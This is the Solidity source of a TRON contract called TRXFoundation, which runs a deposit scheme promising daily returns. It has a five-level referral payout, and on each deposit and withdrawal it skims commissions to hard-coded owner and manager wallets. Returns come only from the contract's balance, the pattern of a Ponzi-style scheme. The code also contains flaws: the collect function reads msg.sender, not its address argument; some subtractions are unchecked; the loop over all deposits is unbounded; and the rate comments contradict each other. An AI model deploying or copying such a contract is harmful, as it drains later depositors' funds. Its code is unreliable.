//SourceUnit: TRXFoundation.sol

pragma solidity ^0.5.4;

contract TRXFoundation {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalDepositCount = 0;
    uint public payID = 0;
    uint public totalPayout;
    uint public totalInvested;
    uint public toTrx = 1000000;
    uint public extra = 4000000 * toTrx; //4000000
    uint public devCommission = 10;

    uint public minDepositSize = 100*toTrx; // 100
    uint public plus1k = 1000*toTrx; // 1000
    uint public plus4k = 4000*toTrx; // 4000
    uint public totallevel = 15;
    uint public level1 = 10;



    uint public interestRateDivisor = 200000000000; // 1% daily 
 
    uint public commissionDivisor = 100;
    uint public hourRate = 83333333; //DAILY 2%
 //   uint private releaseTime = 1593702000;

    address payable owner;
    address payable manager;

    

    struct Player {

        uint trxDeposit;
        uint depositCount;
        uint time;        
        uint roiProfit;
        uint payoutSum;
        uint maxRec;
        uint isActive;
        address payable refFrom;
        uint256 ref1sum; //5 level
        uint256 ref2sum;
        uint256 ref3sum;
        uint256 ref4sum;
        uint256 ref5sum;
        uint hourPassed;  
         
    }

    struct Business {

        uint myTotalInvestment;
        uint myTotalDirectBiz;
        uint directBiz; 
        uint myTotalBiz;
        uint joiningTime;        
         uint lastroiPaid;       
         uint refRewards;
        uint payRewards;
        uint roiRewards;
        uint totalRewards; 
        uint maxRoi;
        uint lastDeposit;
    }

        struct Payout { 
          uint id;
          uint amount;
          address payable player;
          uint payTime;
          string payType;
        }

         struct Deposit { 
           
           uint id;
           uint amount;
           address payable depAddress;
           uint time;
           uint maxRec;
           uint roiClaimed;
           uint roiGenerated;
           uint isActive; 

        
         }


    mapping(address => Player) public players;
    mapping(address => Business) public playersBiz;
    mapping(uint => Payout) public payouts;
    mapping(uint => Deposit) public deposits;

    constructor() public {
      owner = 0x41F6fAb3DaeAb041F9eC03565Cff12c2015891E3;
      manager = 0x5A617911d95120B25b3c6d473D4450F9e4c801f2;   // real manager
     Player storage player = players[owner];
     Business storage playerbiz = playersBiz[owner];
     totalPlayers++;
     player.trxDeposit = plus4k;
     playerbiz.myTotalInvestment = plus4k;
     player.maxRec = 2000*plus4k;
     player.time = now;
     playerbiz.joiningTime = now;
     player.isActive = 1;
     player.depositCount = 1;

      totalDepositCount++;
      Deposit storage dep = deposits[totalDepositCount];
      dep.id = totalDepositCount;
      dep.depAddress = owner;
      dep.amount = player.trxDeposit;
      dep.time = now;
      dep.maxRec = 2*dep.amount;
      dep.roiClaimed = 0;
      dep.roiGenerated = 0;
      dep.isActive = 1;
           

      } 

    function register(address payable _addr, address payable _refAddr) private {

      Player storage player = players[_addr];
// Business storage playerbiz = playersBiz[_addr];

      player.refFrom = _refAddr;

      address payable _refAddr1 = _refAddr;
      address payable _refAddr2 = players[_refAddr1].refFrom;
      address payable _refAddr3 = players[_refAddr2].refFrom;
      address payable _refAddr4 = players[_refAddr3].refFrom;
      address payable _refAddr5 = players[_refAddr4].refFrom;
    
      players[_refAddr1].ref1sum = players[_refAddr1].ref1sum.add(1);
      players[_refAddr2].ref2sum = players[_refAddr2].ref2sum.add(1);
      players[_refAddr3].ref3sum = players[_refAddr3].ref3sum.add(1);
      players[_refAddr4].ref4sum = players[_refAddr4].ref4sum.add(1);
      players[_refAddr5].ref5sum = players[_refAddr5].ref5sum.add(1); 

    }

    function () external payable {

    }

    function invest(address payable _refAddr) public payable {
        collect(msg.sender);
        require(msg.value >= minDepositSize && players[msg.sender].trxDeposit == 0);
 
        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];
        Business storage playerbiz = playersBiz[msg.sender];

        if (player.time == 0) {
            
            player.time = now;
            player.isActive = 1;
            playerbiz.joiningTime = now;
            player.depositCount = 1;
            
            totalPlayers++;
            
            if(_refAddr != address(0) && players[_refAddr].trxDeposit >= plus1k){
              register(msg.sender, _refAddr);
              playersBiz[_refAddr].directBiz += msg.value ; 
              
            }
            else
            {
              register(msg.sender, owner);
              playersBiz[owner].directBiz += msg.value ;

            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        playerbiz.lastDeposit = msg.value;
        playersBiz[msg.sender].myTotalInvestment = playersBiz[msg.sender].myTotalInvestment.add(depositAmount); 
        player.maxRec = player.trxDeposit.mul(2); 
        player.isActive = 1;

        distributeRef(msg.value, player.refFrom); 
        if(totalInvested > extra){
          devCommission = 17;
        }
      totalDepositCount++;
      Deposit storage dep = deposits[totalDepositCount];
      dep.id = totalDepositCount;
      dep.depAddress = msg.sender;
      dep.amount = msg.value;
      dep.time = now;
      dep.maxRec = 2*dep.amount;
      dep.roiClaimed = 0;
      dep.roiGenerated = 0;
      dep.isActive = 1;
            
        totalInvested = totalInvested.add(depositAmount);
        uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(devEarn);
        manager.transfer(devEarn);
    }

    function reinvest() public payable {
        
        collect(msg.sender);
        Player storage player = players[msg.sender];
        Business storage playerbiz = playersBiz[msg.sender];
        require(msg.value >= player.trxDeposit && msg.value >= playerbiz.lastDeposit );
 
         uint depositAmount = msg.value;
         address payable _refAddr = player.refFrom;
 
             
             player.time = now;
             player.isActive = 1;
             playerbiz.joiningTime = now;
             playerbiz.directBiz = 0;
             player.hourPassed = 0;
             playerbiz.lastDeposit = msg.value;
             player.depositCount++; 
             if(totalInvested > extra){
                devCommission = 17;
             }
          
             
            if(_refAddr != address(0) && players[_refAddr].trxDeposit >=  plus1k){
               playersBiz[_refAddr].directBiz += msg.value ; 
                
           } 
         
        player.trxDeposit = msg.value;
        playerbiz.myTotalInvestment = playerbiz.myTotalInvestment.add(depositAmount); 
        player.maxRec = (player.trxDeposit.mul(2)).add(player.maxRec);
        
 
      totalDepositCount++;
      Deposit storage dep = deposits[totalDepositCount];
      dep.id = totalDepositCount;
      dep.depAddress = msg.sender;
      dep.amount = msg.value;
      dep.time = now;
      dep.maxRec = 2*dep.amount;
      dep.roiClaimed = 0;
      dep.roiGenerated = 0;
      dep.isActive = 1;
     
        distributeRef(msg.value, player.refFrom); 

        totalInvested = totalInvested.add(depositAmount);
        uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(devEarn);
        manager.transfer(devEarn);

    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].roiProfit > 0 && players[msg.sender].isActive == 1);

        transferPayout(msg.sender, players[msg.sender].roiProfit);
    } 

    function collect(address payable _addr) public returns (uint) {
        Player storage player = players[_addr];
        uint _maxRec = 0;
        uint _netRoi = 0;
        uint _totalRoi = 0;

        for(uint i=1; i<= totalDepositCount; i++){
          Deposit storage deposit = deposits[i];
          if(msg.sender == deposit.depAddress && deposit.isActive == 1){
              uint _time = toHours(deposit.time);
              uint _depAmount = deposit.amount;
              _maxRec += deposit.maxRec;
 
            uint  collectProfit = _depAmount.mul(_time.mul(hourRate)).div(interestRateDivisor);
              if(collectProfit >= _maxRec ){
                collectProfit = _maxRec;
                deposit.isActive = 0;
              }

              _totalRoi += collectProfit;
 
          }
        } 
          playersBiz[_addr].roiRewards = _totalRoi;
          uint _maxRoi = player.maxRec - player.payoutSum;
          uint _roiPaid = player.payoutSum - playersBiz[_addr].totalRewards;
            _netRoi = _totalRoi - _roiPaid;
          if(_netRoi >= _maxRoi){
            player.roiProfit = _maxRoi;
          } else {
            player.roiProfit = _netRoi;
          }
          return player.roiProfit;
    }

     function toHours(uint _time) internal view returns (uint) {
        uint _sec = now  - _time;
        uint _tomin = _sec/60; // 60
         uint _tohour = _tomin/60;

             if(_tohour > 4800){
        _tohour = 4800;
      }
 
         return _tohour;
    
    //        return _tohour; // _tohour
    }

    function transferPayout(address payable _receiver, uint _amount) internal { 
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
 
            if (contractBalance > 0) {

                uint payout = _amount > contractBalance ? contractBalance : _amount;
 
                Player storage player = players[_receiver];
                Business storage playerbiz = playersBiz[_receiver];

                if(player.payoutSum.add(payout) >= player.maxRec){
                    payout = player.maxRec - player.payoutSum;
                    player.isActive = 0;
                 }

                player.payoutSum = player.payoutSum.add(payout);
                player.roiProfit = player.roiProfit.sub(payout);
                totalPayout = totalPayout.add(payout);

                if(totalInvested > extra){
                  devCommission = 17;
                }

                if(payout > 0){
                   msg.sender.transfer(payout);
                   payID ++;
                   Payout(payID,payout,msg.sender,now,"roiRewards");
                   playerbiz.lastroiPaid = now;
              
                   uint devEarn = payout.mul(devCommission).div(commissionDivisor);
                   owner.transfer(devEarn);
                   manager.transfer(devEarn);

                    address payable _refAddr1 = player.refFrom;
                    
                    address payable _refAddr2 = players[_refAddr1].refFrom;
                    address payable _refAddr3 = players[_refAddr2].refFrom;
                    address payable _refAddr4 = players[_refAddr3].refFrom;
                    address payable _refAddr5 = players[_refAddr4].refFrom;
                    uint _payRewards = (payout.mul(75)).div(100);
                    uint _allref = _payRewards;


                   if (  players[_refAddr1].isActive == 1 &&  playersBiz[_refAddr1].myTotalInvestment >= plus4k) {
                            _payRewards = (payout.mul(50)).div(100);
                            _allref = _allref.sub(_payRewards);
                             
                            checkActivePay(_refAddr1,_payRewards);
                     }
                       if (  players[_refAddr2].isActive == 1 &&  playersBiz[_refAddr2].myTotalInvestment >= plus4k) {
                             _payRewards = (payout.mul(10)).div(100);
                            _allref = _allref.sub(_payRewards);
                           
                             checkActivePay(_refAddr2,_payRewards);
                    }
                       if (  players[_refAddr3].isActive == 1 &&  playersBiz[_refAddr3].myTotalInvestment >= plus4k) {
                             _payRewards = (payout.mul(5)).div(100);
                            _allref = _allref.sub(_payRewards);
                           
                            checkActivePay(_refAddr3,_payRewards);
                     }
                       if (  players[_refAddr4].isActive == 1 &&  playersBiz[_refAddr4].myTotalInvestment >= plus4k) {
                             _payRewards = (payout.mul(5)).div(100);
                            _allref = _allref.sub(_payRewards);
                           
                            checkActivePay(_refAddr4,_payRewards);
                     }
                       if (  players[_refAddr5].isActive == 1 &&  playersBiz[_refAddr5].myTotalInvestment >= plus4k) {
                             _payRewards = (payout.mul(5)).div(100);
                            _allref = _allref.sub(_payRewards);
                           
                            checkActivePay(_refAddr5,_payRewards);
                     }
                     if(_allref > 0){
                      owner.transfer(_allref/2);
                      manager.transfer(_allref/2);
                     }
                } 
            }
        }
    }

    function distributeRef(uint256 _trx, address payable _refFrom) private {

        uint256 _allref = (_trx.mul(10)).div(100);

        address payable _refAddr1 = _refFrom;
        uint _refRewards = 0;
         
        if (_refAddr1 != address(0) && players[_refAddr1].isActive == 1 ) {
            if(players[_refAddr1].trxDeposit >= plus1k){
              _refRewards = (_trx.mul(10)).div(100);
              _allref = _allref.sub(_refRewards);
                             
              checkActiveRef(_refAddr1,_refRewards);
            }
           
        } 
        
        if(_allref > 0 ){
            owner.transfer(_allref);
        }
    }

    function checkActivePay(address payable _addr, uint _payValue) private {

                            uint _temp;
                          _temp = players[_addr].maxRec - players[_addr].payoutSum;
                          if(_payValue > _temp){
                            _payValue = _temp;
                            players[_addr].isActive = 0;
                            }

                            playersBiz[_addr].payRewards = _payValue.add(playersBiz[_addr].payRewards);
                            playersBiz[_addr].totalRewards = _payValue.add(playersBiz[_addr].totalRewards);
                            players[_addr].payoutSum = _payValue.add(players[_addr].payoutSum);
                            _addr.transfer(_payValue);
                            payID ++;
                            Payout(payID,_payValue,_addr,now,"payRewards");   
      }

     function checkActiveRef(address payable _addr, uint _refValue) private {

       uint _temp;
      _temp = players[_addr].maxRec - players[_addr].payoutSum;

      if(_refValue > _temp){
        _refValue = _temp;
         players[_addr].isActive = 0;
      
      } 
 
            playersBiz[_addr].refRewards = _refValue.add(playersBiz[_addr].refRewards);
            playersBiz[_addr].totalRewards = _refValue.add(playersBiz[_addr].totalRewards);
            playersBiz[_addr].myTotalDirectBiz += msg.value ;
            playersBiz[_addr].myTotalBiz += msg.value ;
            players[_addr].payoutSum += _refValue ;
            _addr.transfer(_refValue);
            payID ++;
            Payout(payID,_refValue,_addr,now,"refRewards");
             
      
    }

  function getNow() public view returns (uint) {
       return now;
       }   

  function getTime() public view returns (uint) {
       return block.timestamp;
       }   


 function checkOwner() public view returns  (address payable){  
      return  owner ;
   }

   function checkManager() public view returns  (address payable){   
      return  manager ;
   }

   function changeOwner(address payable _newOwner) public {  
     require(msg.sender == owner,"You are not owner");
         owner = _newOwner;
   }

   function changeManager(address payable _newManager) public {  
    require(msg.sender == manager,"You are not manager");
         manager = _newManager;
   } 


}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}